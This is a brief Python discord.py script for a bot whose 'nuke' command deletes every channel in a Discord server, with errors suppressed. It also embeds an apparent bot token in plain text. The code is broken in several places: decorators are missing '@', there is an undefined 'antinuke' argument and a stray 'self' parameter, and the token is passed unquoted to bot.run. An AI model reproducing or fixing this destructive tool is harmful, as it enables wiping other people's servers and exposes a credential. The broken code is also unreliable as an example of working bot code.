bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

bot.event
async def on_ready():
    print(bot.user, 'is ready')

bot.command(antinuke)
async def nuke(self, ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    print('Complete')

token = input(' OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.nDImXzE2suS9sLYaaG-TKiwlf-Y')
bot.run(OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.nDImXzE2suS9sLYaaG-TKiwlf-Y)
